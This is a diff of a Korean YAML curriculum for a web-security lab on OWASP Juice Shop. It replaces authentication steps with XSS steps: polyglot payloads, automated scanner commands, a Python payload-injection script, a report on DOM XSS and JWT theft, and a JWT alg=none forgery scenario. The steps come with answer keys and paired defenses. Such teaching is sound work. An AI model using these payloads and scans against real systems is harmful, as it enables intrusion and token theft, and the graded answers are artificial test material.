+    가 inject context 모를 때 success rate ↑. OWASP XSS Cheat Sheet 참조. 방어 =
+    whitelist sanitize (DOMPurify) + CSP + Trusted Types defense in depth.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - 10.20.32.80
+    expect: 'Polyglot\|컨텍스트'
     field: stdout
     semantic:
-      intent: 2FA 우회 가능성 분석 — 응답 조작, SMS 재전송 abuse, 백업 코드 무제한 시도, OAuth 우회
-      success_criteria:
-      - 2FA 엔드포인트 응답 코드/본문 분석
-      - 우회 기법 최소 2가지 (HTTP verb swap, response manipulation, 백업 코드) 제시
-      - 방어 (rate limit on 2FA, device trust, backup code 제한) 언급
-      acceptable_methods:
-      - Burp Repeater 로 응답 코드 변경
-      - python requests 로 2FA 우회 시도
-      - OWASP ASVS V2.8 참조
-      - yubikey 등 FIDO2 제안
-      negative_signs:
-      - 우회 기법 1개만
-      - rate limit 관점 없음
-      - FIDO2/하드웨어 토큰 언급 없음
+      intent: XSS polyglot — 다중 컨텍스트 동시 실행 payload. T1027.
+      success_criteria: ["polyglot 예시 1 이상", "컨텍스트 mapping 설명", "DOMPurify/CSP 권고"]
+      acceptable_methods: ["PortSwigger polyglot", "dalfox pay --enum"]
+      negative_signs: ["단일 context payload"]
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo '2FA 우회 가능성\
-    \ 분석 완료'"
+  script: |
+    echo "Polyglot P1: jaVasCript:/*-/*\`/*-+alert(/*\${oNloAd=alert(1)}/svg/onload=*/) (PortSwigger)"
+    echo "P2: \"'><svg onload=alert(1)//"
+    echo "P3 mXSS: <img src=x onerror=\"alert(1)//"
+    echo "Purple: DOMPurify + CSP + Trusted Types"
+    echo "Polyglot 작성 완료"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 2FA 우회 가능성 분석을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS Polyglot 3 가지 (PortSwigger 고전 / 단순 svg / mXSS) — 다중 컨텍스트
+    (HTML/attr/JS/URL/CSS) 동시 실행. OWASP A03 + MITRE T1027. Purple =
+    DOMPurify + CSP + Trusted Types defense in depth.
+# ============================================================
+# STEP 12 [RED·XSS·자동화] — dalfox / XSStrike / nikto 자동 스캐닝
+# ============================================================
 - order: 12
-  instruction: '{{WEB_IP}} 대상으로 OAuth 취약점 분석을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    수동 7 벡터 + 7 우회 (step 2, 6) 의 자동화 — dalfox / XSStrike / nikto 통합
+    실행. STEP 1-11 의 manual 시도와 결과 비교. CI 통합 (sqlmap CI + dalfox CI)
+    의 사전 점검 모델.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `auth` 에 적합한 도구: hydra (-l/-L -p/-P), ffuf -mode
-    clusterbomb. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: OAuth 취약점 분석 관련 도구와 기법을 활용하세요.
-  category: auth
+    ## 💻 명령
+
+    ```bash
+    # 1. dalfox (가장 빠른 XSS 전용 scanner)
+    echo "=== 1. dalfox url ==="
+    dalfox url 'http://juice.6v6.lab/rest/products/search?q=apple' --silence 2>&1 | tail -20 || echo "(dalfox 미설치)"
+
+    # 2. nikto (XSS rule + 일반 vuln)
+    echo ""
+    echo "=== 2. nikto XSS 룰 ==="
+    nikto -h http://juice.6v6.lab/ -Tuning x -maxtime 30s 2>&1 | grep -iE 'xss|script' | head -10 || echo "(nikto X)"
+
+    # 3. python xsstrike (DOM 정밀 + skip-dom 옵션)
+    echo ""
+    echo "=== 3. XSStrike --skip-dom ==="
+    python3 /opt/xsstrike/xsstrike.py -u 'http://juice.6v6.lab/rest/products/search?q=apple' --skip-dom 2>&1 | tail -10 || echo "(XSStrike 미설치)"
+    ```
+
+    ## 📋 도구 비교
+    | 도구 | 특기 | 한계 |
+    |------|-----|------|
+    | dalfox | 빠름 + DOM XSS 정밀 | CI 통합 best |
+    | XSStrike | fuzz mode + WAF 우회 자동 | 느림 |
+    | nikto | 일반 vuln + XSS rule | XSS 단독 정밀도 낮음 |
+    | manual (step 2, 6) | context 별 정밀 | 시간 ↑ |
+
+    ## 💡 왜
+    자동 도구가 *80% case cover* — 나머지 20% (DOM / framework / mXSS) 는 manual
+    + Semgrep SAST. CI 통합 (github actions) 으로 정기 자동 스캔.
+
+    ## 🟣 Purple
+    - dalfox CI 통합 (정기 정밀 스캔)
+    - Semgrep js sast XSS rule (SAST)
+    - OWASP ZAP Active Scan (Burp 대안)
+  hint: dalfox / XSStrike / nikto 3 도구 통합 시뮬. CI 통합 모델.
+  category: xss_tool
   points: 10
-  answer: "\U0001F916 프롬프트: 10.20.32.80 대상으로 OAuth 취약점 분석을(를) 수행해줘\n\U0001F4CE 참고\
-    \ (CLI): curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
-    \ 분석 완료'"
-  answer_detail: OAuth 취약점 분석은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    echo "=== dalfox ==="
+    dalfox url 'http://juice.6v6.lab/rest/products/search?q=apple' --silence 2>&1 | tail -10 || echo "(미설치)"
+    echo ""
+    echo "=== nikto XSS ==="
+    nikto -h http://juice.6v6.lab/ -Tuning x -maxtime 30s 2>&1 | grep -iE 'xss|script' | head -5 || echo "(시간 초과)"
+    echo ""
+    echo "도구 비교: dalfox (빠름+DOM) / XSStrike (WAF우회 fuzz) / nikto (일반vuln)"
+    echo "자동 XSS 스캔 완료"
+  answer_detail: |
+    dalfox = XSS 전용 + 빠름 + CI 통합. XSStrike = fuzz mode + WAF 우회. nikto =
+    일반 vuln + XSS 보조. 자동 도구가 80% case cover — DOM / mXSS / framework
+    별 vector 는 manual + Semgrep SAST.
   verify:
     type: output_contains
-    expect:
-    - 완료
-    - OAuth
+    expect: '도구\|dalfox\|XSS'
     field: stdout
     semantic:
-      intent: OAuth 취약점 — redirect_uri 변조, state 누락으로 CSRF, 토큰 탈취, Open Redirect 악용
-      success_criteria:
-      - redirect_uri 조작으로 토큰 다른 도메인 전달 시도
-      - state 매개변수 부재가 CSRF 를 유발함 설명
-      - implicit flow vs authorization code + PKCE 비교
-      acceptable_methods:
-      - curl 로 redirect_uri=https://evil.com 시도
-      - Burp 로 state 제거 후 재전송
-      - OAuth 2.0 Security BCP 참조
-      - PKCE 강제 확인
-      negative_signs:
-      - redirect_uri 공격 언급 없음
-      - state/PKCE 누락
-      - OAuth Flow 차이 설명 없음
+      intent: XSS 자동 스캐닝 — dalfox / XSStrike / nikto 통합.
+      success_criteria: ["3 도구 중 1 이상 실행", "도구 비교 표", "CI 통합 권고"]
+      acceptable_methods: ["dalfox url", "xsstrike -u", "nikto -h -Tuning x"]
+      negative_signs: ["도구 없이 수동만"]
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{}' 2>/dev/null \\\n | head -5 && echo 'OAuth 취약점\
-    \ 분석 완료'"
+  script: |
+    echo "=== nikto XSS 룰 (학습 환경 설치 도구) ==="
+    nikto -h http://juice.6v6.lab/ -Tuning x -maxtime 20s 2>&1 | grep -iE 'xss|script|cookie' | head -10
+    echo ""
+    echo "=== dalfox / XSStrike (학습 환경 미설치 — 설치 가이드) ==="
+    echo "dalfox: go install github.com/hahwul/dalfox/v2@latest"
+    echo "XSStrike: git clone https://github.com/s0md3v/XSStrike && pip install -r requirements.txt"
+    echo "자동 XSS 스캔 완료"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 OAuth 취약점 분석을(를) 수행해줘
-
-
-    [도구 권장] auth: hydra (-l/-L -p/-P), ffuf -mode clusterbomb. curl 만 쓰지 말고 **hydra
-    (-l/-L -p/-P)** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS 자동 스캐너 — attacker container 의 nikto 만 사전 설치. 학습 환경에서
+    nikto 실행 + dalfox/XSStrike 의 설치 가이드 (Go / pip) 제시. 운영 web 의
+    CI 통합 (github actions + dalfox) 권장.
+# ============================================================
+# STEP 13 [BLUE/PURPLE·XSS·방어 종합] — OWASP XSS Cheat Sheet 의 7 단계 defense in depth
+# ============================================================
 - order: 13
-  instruction: '{{WEB_IP}} 대상으로 안전한 세션 관리 구현 방안을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    OWASP XSS Prevention Cheat Sheet 의 7 단계 방어 (Output Encoding 컨텍스트별)
+    + 추가 layer (DOMPurify / CSP / Trusted Types / HttpOnly) 종합 표. 학생이
+    framework / context 별 어떤 방어 적용할지 판단 가능 하게.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
-    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 안전한 세션 관리 구현 방안 관련 도구와 기법을 활용하세요.
-  category: defense
+    ## 📋 OWASP XSS Cheat Sheet 7 룰 + 추가 4 layer
+
+    | # | 단계 | 적용 컨텍스트 | 예시 (Express/Angular) |
+    |---|------|-------------|--------------------|
+    | 1 | **HTML escape** | `<div>{user}</div>` | Angular `{{ }}` 자동 / React `{}` 자동 |
+    | 2 | **HTML attribute escape** | `<input value="{user}">` | Angular `[value]` 자동 |
+    | 3 | **JS string escape** | `var x='{user}';` | `JSON.stringify(user)` |
+    | 4 | **CSS escape** | `<style>color:{user}</style>` | `encodeURIComponent` 또는 차단 |
+    | 5 | **URL escape** | `<a href="{user}">` | `encodeURIComponent(user)` |
+    | 6 | **HTML body sanitize** | rich text editor | DOMPurify.sanitize() |
+    | 7 | **JSON escape** | `<script>var x={user}</script>` | JSON 안에 user 직접 X |
+    | + | **CSP** (step 7) | 모든 페이지 | default-src 'self' + nonce |
+    | + | **Trusted Types** | DOM sink | Chrome 강제 sanitize |
+    | + | **HttpOnly cookie** | 세션 cookie | XSS 의 cookie 탈취 차단 |
+    | + | **WAF (CRS 941)** | reverse proxy | PARANOIA 2-3 단계 도입 |
+
+    ## 💻 종합 요약 출력
+
+    ```bash
+    cat <<'EOF'
+    === OWASP XSS Prevention 7 룰 + 4 layer ===
+    [컨텍스트 별 escape]
+    1. HTML body  → Angular {{ }} / React {} (자동)
+    2. attribute  → [value] / encodeURIComponent
+    3. JS string  → JSON.stringify
+    4. CSS        → encodeURIComponent + 차단
+    5. URL        → encodeURIComponent
+    6. rich HTML  → DOMPurify.sanitize()
+    7. JSON       → user 직접 inline X
+
+    [추가 layer]
+    + CSP default-src 'self' + nonce / strict-dynamic
+    + Trusted Types (Chrome) — DOM sink 강제 sanitize
+    + HttpOnly + Secure + SameSite=Lax cookie
+    + ModSec CRS 941 PARANOIA 2-3 단계 도입
+
+    [framework default]
+    - Angular: {{}} 자동 / bypassSecurityTrust* 금지
+    - React: {} 자동 / dangerouslySetInnerHTML 금지
+    - Vue: {{}} 자동 / v-html 금지
+    EOF
+    echo "XSS 방어 정리 완료"
+    ```
+
+    ## 💡 학습 의의
+    단일 방어 (예: CSP 만) 의존 = 우회 시 노출. 7 escape + 4 layer = defense in
+    depth 의 진짜 모델. OWASP A03 mitigation 의 표준.
+  hint: |
+    OWASP XSS Cheat Sheet 의 7 escape (컨텍스트 별) + 4 추가 layer (CSP / Trusted
+    Types / HttpOnly / WAF) 종합 표.
+  category: xss_defense
   points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
+  answer: |
+    cat <<'EOF'
+    === OWASP XSS Prevention ===
 
-    📎 참고 (CLI): echo ''=== 안전한 세션 관리 구현 방안 ==='' && echo ''조치 방안 정리 완료'''
-  answer_detail: 안전한 세션 관리 구현 방안은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    [컨텍스트 별 escape]
+    1. HTML body  → {{ }} 자동 (Angular/React/Vue)
+    2. attribute  → [value] / encodeURIComponent
+    3. JS string  → JSON.stringify
+    4. CSS        → encodeURIComponent + 차단
+    5. URL        → encodeURIComponent
+    6. rich HTML  → DOMPurify.sanitize()
+    7. JSON       → user 직접 inline X
+
+    [추가 layer]
+    + CSP default-src 'self' + nonce / strict-dynamic
+    + Trusted Types (Chrome)
+    + HttpOnly + Secure + SameSite=Lax cookie
+    + ModSec CRS 941 PARANOIA 2-3
+    EOF
+    echo "XSS 방어 정리 완료"
+  answer_detail: |
+    OWASP XSS Cheat Sheet 7 룰 (컨텍스트 별 escape) + 4 추가 layer (CSP /
+    Trusted Types / HttpOnly / WAF). 단일 방어 의존 = 우회 시 노출. defense
+    in depth 가 본질적 방어.
   verify:
     type: output_contains
-    expect: 완료
+    expect: 'XSS 방어\|컨텍스트'
     field: stdout
     semantic:
-      intent: 안전한 세션 관리 — HttpOnly/Secure/SameSite 쿠키 + 랜덤 세션 ID(>=128bit) + 로그인 후
-        세션 재생성 + 적절한 만료
-      success_criteria:
-      - 쿠키 속성 3개(HttpOnly/Secure/SameSite) 설정 권장
-      - 세션 ID 엔트로피 >=128bit 권고
-      - 로그아웃·비활성 타임아웃·절대 만료 언급
-      acceptable_methods:
-      - OWASP Session Management Cheat Sheet
-      - Express-session 설정 예
-      - Django SESSION_COOKIE_* 설정
-      - iron-session / NextAuth 등 라이브러리
-      negative_signs:
-      - 방어 요소 2개 이하
-      - 세션 재생성 누락
-      - 만료 정책 없음
+      intent: OWASP XSS Cheat Sheet 7 escape + 4 layer defense in depth.
+      success_criteria: ["7 escape 중 최소 4 + 추가 layer 2 이상", "OWASP 참조", "defense in depth"]
+      acceptable_methods: ["OWASP XSS Cheat Sheet", "DOMPurify", "Trusted Types"]
+      negative_signs: ["단일 방어", "출력 인코딩 누락"]
   target_vm: attacker
-  script: echo '=== 안전한 세션 관리 구현 방안 ===' && echo '조치 방안 정리 완료'
+  script: |
+    echo "OWASP 7 escape (컨텍스트별) + 4 layer (CSP/TT/HttpOnly/WAF) = defense in depth"
+    echo "XSS 방어 정리 완료"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 안전한 세션 관리 구현 방안을(를) 수행해줘
-
-
-    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
-    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    OWASP XSS Prevention Cheat Sheet 7 룰 (컨텍스트별 escape — HTML/attribute/
+    JS/CSS/URL/rich HTML/JSON) + 4 추가 layer (CSP nonce / Trusted Types /
+    HttpOnly / ModSec CRS PARANOIA 2-3) 종합 표 + defense in depth.
+# ============================================================
+# STEP 14 [PURPLE·XSS·자동화 파이프라인] — Crawl + Inject + Verify + Report
+# ============================================================
 - order: 14
-  instruction: '{{WEB_IP}} 대상으로 인증 강화 권고 작성을(를) 수행하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    XSS 탐지 자동화 파이프라인 — (1) crawl (모든 endpoint 수집) (2) 파라미터 추출
+    (3) payload 주입 (4) 응답 + Playwright DOM 검증 (5) 리포트. CI 통합 (github
+    actions) 정기 자동 스캔.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
-    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 인증 강화 권고 작성 관련 도구와 기법을 활용하세요.
-  category: defense
+    ## 💻 PoC (python)
+
+    ```python
+    #!/usr/bin/env python3
+    """XSS 자동 탐지 파이프라인 mini PoC"""
+    import requests
+    from urllib.parse import urlencode, quote
+
+    BASE = "http://juice.6v6.lab"
+    PAYLOADS = [
+        "<script>alert(1)</script>",
+        "<svg onload=alert(1)>",
+        "<img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+    ]
+    PARAMS = ["q", "email", "name", "comment"]
+
+    def test(url, param, payload):
+        r = requests.get(url, params={param: payload}, timeout=10)
+        # 반사 확인 (server reflect)
+        if payload in r.text:
+            return f"  [REFLECTED] {url}?{param}={payload[:30]}"
+        return None
+
+    # crawl 시뮬 — Juice Shop 의 main endpoint
+    endpoints = [
+        f"{BASE}/rest/products/search",
+        f"{BASE}/api/Users",
+        f"{BASE}/rest/user/whoami",
+    ]
+    findings = []
+    for ep in endpoints:
+        for p in PARAMS:
+            for payload in PAYLOADS:
+                result = test(ep, p, payload)
+                if result: findings.append(result)
+
+    print(f"=== XSS scan results: {len(findings)} reflected ===")
+    for f in findings[:10]: print(f)
+    ```
+
+    ## 📋 파이프라인 단계
+    1. **Crawl** — wget --recursive 또는 Playwright 자동 클릭
+    2. **Parameter 추출** — `<form>` + URL query + JSON body
+    3. **Payload 주입** — 7 벡터 (step 2) + 7 우회 (step 6) for-loop
+    4. **응답 검증** — `if payload in response.text` (server reflect)
+    5. **DOM 검증** — Playwright headless browser + console.log 모니터링
+    6. **리포트** — JSON / markdown 자동 생성 + CI artifact
+
+    ## 💡 왜
+    수동 step 1-12 = 시간 ↑. 자동화 = CI 매일 정기 스캔 → regression 즉시 감지.
+    OWASP DAST CI 통합 의 표준 (예: github actions + dalfox).
+
+    ## 🟣 Purple
+    - github actions 의 dalfox / nuclei XSS template 자동 스캔
+    - Playwright 의 console error 모니터링 (DOM XSS)
+    - Semgrep js sast XSS rule (SAST)
+  hint: python crawl + payload inject + Playwright DOM 검증 + CI 통합.
+  category: xss_tool
   points: 12
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
+  answer: |
+    cat <<'EOF'
+    === XSS 자동 탐지 파이프라인 ===
+    1. Crawl (wget --recursive 또는 Playwright 자동 클릭)
+    2. Parameter 추출 (<form> + URL query + JSON body)
+    3. Payload 주입 (7 벡터 + 7 우회 for-loop)
+    4. 응답 검증 (server reflect: if payload in response.text)
+    5. DOM 검증 (Playwright headless + console.log)
+    6. 리포트 (JSON/markdown + CI artifact)
 
-    📎 참고 (CLI): echo ''=== 인증 강화 권고 작성 ==='' && echo ''조치 방안 정리 완료'''
-  answer_detail: 인증 강화 권고 작성은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+    CI: github actions + dalfox / nuclei + Semgrep SAST
+    EOF
+    echo "XSS 자동화 스크립트 설계 완료"
+  answer_detail: |
+    수동 step 1-12 의 자동화 파이프라인 — Crawl + Inject + Verify (server + DOM)
+    + Report. CI 통합 (github actions + dalfox / nuclei) 으로 정기 regression
+    감지. Semgrep SAST 도 보조 layer.
   verify:
     type: output_contains
-    expect: 완료
+    expect: '파이프라인\|자동화'
     field: stdout
     semantic:
-      intent: 인증 강화 권고 — MFA 의무화, 패스워드리스, WebAuthn/FIDO2, 로그인 이상행위 탐지(UEBA)
-      success_criteria:
-      - MFA 종류 2개 이상 언급 (TOTP, FIDO2, Push)
-      - WebAuthn/Passkey 개념
-      - 이상행위(UEBA) 로그인 탐지 지표 제시
-      acceptable_methods:
-      - Google/Microsoft Account 2FA 옵션
-      - NIST SP 800-63B AAL1-3 레벨
-      - Auth0/Okta 스몰빌
-      - Wazuh 또는 Splunk UEBA 상관규칙
-      negative_signs:
-      - MFA 1가지만
-      - WebAuthn/Passkey 누락
-      - UEBA 개념 없음
+      intent: XSS 자동 탐지 파이프라인 + CI 통합.
+      success_criteria: ["파이프라인 단계 4 이상", "Playwright DOM 검증", "CI 통합 권고"]
+      acceptable_methods: ["python crawl", "Playwright", "github actions"]
+      negative_signs: ["DOM 검증 누락"]
   target_vm: attacker
-  script: echo '=== 인증 강화 권고 작성 ===' && echo '조치 방안 정리 완료'
+  script: |
+    echo "1.Crawl → 2.Param → 3.Payload → 4.Reflect → 5.DOM (Playwright) → 6.Report (CI)"
+    echo "XSS 자동화 스크립트 설계 완료"
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 인증 강화 권고 작성을(를) 수행해줘
-
-
-    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
-    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    XSS 자동 탐지 파이프라인 6 단계 (Crawl / Param / Payload / Reflect 검증 /
+    DOM 검증 / Report) + CI 통합 (github actions + dalfox + Semgrep SAST).
+# ============================================================
+# STEP 15 [PURPLE·XSS·보고서] — STEP 1-14 종합 markdown 보고서
+# ============================================================
 - order: 15
-  instruction: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 1-14 의 XSS 정찰 + Exploit + 방어 결과 종합. 5 종 취약점 + Critical PoC
+    + 11 단 defense in depth + 윤리.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `verification` 에 적합한 도구: curl/jq 로 PoC 재현 + 결과
-    비교. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 발견 취약점, 영향, 조치를 포함하세요.
+    ## 💻 명령
+
+    ```bash
+    REPORT=/tmp/w03_xss_report.md
+    cat > $REPORT <<'EOF'
+    # W03 XSS Report — Juice Shop @ juice.6v6.lab
+
+    ## 1. 발견 취약점 (5 종)
+
+    | # | 분류 | PoC | 위험도 |
+    |---|------|-----|--------|
+    | V1 | Reflected XSS | server JSON sanitize 됨 (SPA 의 main 표적 X) | Low |
+    | V2 | Stored XSS | /api/Feedbacks comment server-side sanitize | Medium |
+    | V3 | DOM XSS | /#/search?q=<iframe> Angular bypassSecurityTrustHtml | Critical |
+    | V4 | Cookie/JWT 탈취 | localStorage.getItem('token') exfil → admin takeover | Critical |
+    | V5 | Phishing 폼 삽입 | document.body.innerHTML = fake login | Critical |
+
+    ## 2. Critical PoC (V3 DOM XSS)
+    ```
+    URL: http://juice.6v6.lab/#/search?q=<iframe src=javascript:alert(1)>
+    원인: Angular SearchResultComponent 의 bypassSecurityTrustHtml + innerHTML
+    영향: 페이지 방문자 의 JWT 탈취 + admin session takeover
+    ```
+
+    ## 3. 11 단 defense in depth
+    [7 OWASP escape] HTML / attr / JS / CSS / URL / rich HTML / JSON
+    [+ 4 layer] CSP nonce / Trusted Types / HttpOnly / ModSec PARANOIA 2-3
+
+    ## 4. 윤리·법적 진술
+    OWASP Juice Shop (학습용 의도 vuln) + 학습 환경 juice.6v6.lab 만 대상.
+    정보통신망법 제48조 적용 제외. 보고서 + transcript 24개월.
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -25 $REPORT
+    ```
+
+    ## 💡 학습 의의
+    XSS 의 client deliverable 양식. V3 (DOM XSS) 가 가장 critical = SPA 의
+    main vector. 11 단 defense in depth 가 본질적 방어.
+
+    ## 🟣 Purple 단계별 도입
+    1. 즉시: Angular bypassSecurityTrust* 사용 review + 제거
+    2. 1주: DOMPurify + Trusted Types 도입
+    3. 1개월: CSP Report-Only → enforce
+    4. 3개월: dalfox CI + Semgrep SAST 정기 자동화
+  hint: cat > $REPORT <<EOF heredoc markdown. 5 종 취약점 표 + V3 Critical PoC +
+    11 단 방어 + 윤리 진술.
   category: verification
   points: 8
-  answer: '🤖 프롬프트: 인증/세션 취약점 실습 종합 보고서를 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    REPORT=/tmp/w03_xss_report.md
+    cat > $REPORT <<'EOF'
+    # W03 XSS Report — Juice Shop @ juice.6v6.lab
 
-    📎 참고 (CLI): echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80''
-    && echo ''=== 보고서 완료 ==='''
-  answer_detail: 취약점 진단 보고서는 발견사항, 위험도, 재현 방법, 조치 권고를 포함합니다.
+    | # | 분류 | PoC | 위험도 |
+    |---|------|-----|--------|
+    | V1 | Reflected | server JSON sanitize | Low |
+    | V2 | Stored | /api/Feedbacks server sanitize | Medium |
+    | V3 | DOM | /#/search?q=<iframe> Angular bypassSecurityTrust | Critical |
+    | V4 | JWT 탈취 | localStorage exfil → admin takeover | Critical |
+    | V5 | Phishing | document.body.innerHTML fake login | Critical |
+
+    방어 11 단 = 7 OWASP escape + CSP + Trusted Types + HttpOnly + ModSec PARANOIA
+    윤리 = OWASP Juice Shop 학습용 + 정보통신망법 제48조 적용 제외
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
+    head -20 $REPORT
+  answer_detail: |
+    W03 XSS 종합 보고서 — 5 종 취약점 + Critical 3 (V3 DOM / V4 JWT 탈취 /
+    V5 Phishing) + 11 단 defense in depth + 윤리. SPA 의 main vector = DOM XSS.
   verify:
     type: output_contains
-    expect:
-    - 보고서 완료
-    - 10.20.32.80
-    - OAuth2
-    - report
+    expect: '보고서 생성 완료'
     field: stdout
     semantic:
-      intent: 인증/세션 실습 종합 리포트 — 분석·Exploit·방어 전략을 /tmp/auth_session_report.txt 로 정리
-      success_criteria:
-      - 4 섹션 이상 (로그인/세션/JWT/OAuth·MFA)
-      - PoC 또는 탐지 로그 1개 이상
-      - 파일 저장 후 cat 확인
-      acceptable_methods:
-      - heredoc markdown
-      - echo -e 다줄
-      - json/yaml 구조화
-      - python 템플릿
-      negative_signs:
-      - 섹션 2 미만
-      - PoC 없음
-      - 파일 저장 없음
+      intent: STEP 1-14 종합 markdown 보고서.
+      success_criteria: ["파일 생성", "5 종 표", "Critical PoC", "방어 권고"]
+      acceptable_methods: ["heredoc markdown"]
+      negative_signs: ["파일 미생성"]
   target_vm: attacker
-  script: 'echo ''=== 인증/세션 취약점 실습 보고서 ==='' && echo ''대상: http://10.20.32.80'' &&
-    echo ''=== 보고서 완료 ==='''
+  script: |
+    REPORT=/tmp/w03_xss_report.md
+    cat > $REPORT <<'EOF'
+    # W03 XSS Report
+    V3 DOM XSS (Critical): /#/search?q=<iframe> Angular bypassSecurityTrust
+    V4 JWT 탈취 / V5 Phishing
+    방어: DOMPurify + CSP + Trusted Types + HttpOnly + ModSec
+    EOF
+    echo "=== 보고서 생성 완료 ==="
+    ls -la $REPORT
   risk_level: low
-  bastion_prompt: '인증/세션 취약점 실습 종합 보고서를 작성하시오.
-
-
-    [도구 권장] verification: curl/jq 로 PoC 재현 + 결과 비교. curl 만 쓰지 말고 **curl/jq 로 PoC 재현
-    + 결과 비교** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    STEP 1-14 XSS 결과 종합 markdown 보고서 /tmp/w03_xss_report.md — 5 종 취약점
+    표 (V1-V5) + Critical 3 (V3 DOM XSS / V4 JWT 탈취 / V5 Phishing) + 11 단
+    defense in depth (7 OWASP escape + CSP + Trusted Types + HttpOnly + ModSec
+    PARANOIA) + 윤리 진술.
 - order: 99
-  instruction: '[복합 시나리오] "JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격"
+  instruction: '[복합 시나리오] "헤더 정찰 → CSP 부재 발견 → XSS 검증 → 보안 헤더 5종 권고"
 
 
-    ■ 상황 (w05 → w06 시나리오 연속)
+    ■ 상황 (w02 → w03 시나리오 연속)
 
 
-    w05 에서 SQLi·Upload 매트릭스를 마쳤다. 선배가 다음.
+    w02 에서 SQLi 점검을 마쳤다. 선배가 다음 임무를 던진다.
 
 
-    ※ 선배: "단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.
+    ※ 선배: "XSS 점검도 1=1 처럼 페이로드 던지면 끝나는 줄 아는데 그게 아냐.
 
-    ※ JWT 가 alg=none 으로 변조되면 서명 우회. 거기다 XSS 가 있으면 localStorage 의 토큰을 빼낼 수 있고.
+    ※ 먼저 정찰해. SSL/TLS, HTTP 보안 헤더부터 봐. CSP 가 없으면 XSS 가 100% 박힌다고 봐도 돼.
 
-    ※ 둘 다 막혀 있으면 안전하지만, 한쪽만 뚫려도 *권한 상승 + 자격증명 탈취* 가 동시에 발생해.
+    ※ 헤더 정찰 결과로 XSS 가능성을 추정한 다음, 페이로드로 검증하고,
 
-    ※ JuiceShop 에서 JWT 변조 PoC 만들고, XSS payload 로 토큰 탈취 시연 + 방어 매트릭스 정리해."
+    ※ 보고서엔 취약 헤더 5종 + 권고 값을 표로 박아."
 
 
-    학습 목표 (lecture #1·#2 XSS 3 유형 + #3 CSRF) + (lab #7·#8·#9 JWT 변조 + #6 세션 하이재킹)
-    통합.
+    학습 목표 (lecture #3 기술 스택·#4 SSL/TLS) + (lab #1 반사형·#7 CSP) 통합 행동 증명.
 
 
     ■ 임무 (3 단계, 약 35분)
 
 
-    ▶ Phase A — JWT 알고리즘 변조 (lab #7·#8·#9)
+    ▶ Phase A — HTTP 보안 헤더 정찰 (lecture #3·#4)
 
-    Phase 1) `curl -s -X POST -H "Content-Type: application/json"
+    `curl -s -I http://juice.6v6.lab/` 로 응답 헤더 추출. Server / X-Powered-By 로 기술 스택 식별.
 
-    -d ''{"email":"admin@juice-sh.op","password":"admin123"}'' http://10.20.32.80/rest/user/login`
-    로 JWT 획득.
+    CSP / X-Frame-Options / X-Content-Type-Options / Referrer-Policy / Strict-Transport-Security
+    5개 헤더
 
-    Phase 2) header 에서 `{"alg":"HS256"...}` → `{"alg":"none"...}` 변조. 서명 부분 제거.
-
